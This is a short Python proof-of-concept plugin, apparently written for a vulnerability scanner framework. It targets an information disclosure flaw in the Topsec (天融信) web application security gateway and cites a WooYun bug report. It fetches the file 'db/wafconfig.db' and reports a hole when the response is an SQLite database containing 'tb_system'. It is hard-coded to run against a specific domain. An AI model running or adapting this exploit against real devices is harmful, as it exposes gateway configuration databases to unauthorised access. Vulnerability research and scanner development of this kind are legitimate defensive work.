#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信WEB应用安全网关严重信息泄露漏洞
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0130878
"""
import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = 'db/wafconfig.db'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200  and 'SQLite' in res and 'tb_system' in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'https://www.njfyjf.com/')[1])